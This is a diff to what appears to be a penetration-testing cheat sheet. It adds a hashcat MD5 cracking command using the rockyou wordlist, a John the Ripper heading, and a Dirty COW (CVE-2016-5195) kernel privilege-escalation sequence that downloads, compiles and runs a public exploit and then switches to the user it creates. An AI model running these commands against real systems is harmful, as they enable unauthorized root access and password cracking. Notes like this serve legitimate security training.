@@ -534,6 +534,11 @@ https://crackstation.net/
 ````
 hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
 ````
+##### Md5
+````
+hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
+````
+##### Cracking with Johntheripper
 ````
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ````
@@ -809,6 +814,16 @@ gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Kernel Expoits
+#### CVE-2016-5195
+````
+https://github.com/firefart/dirtycow
+wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+uname -a
+Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+su firefart
+````
 #### CVE-2009-2698
 ````
 uname -a
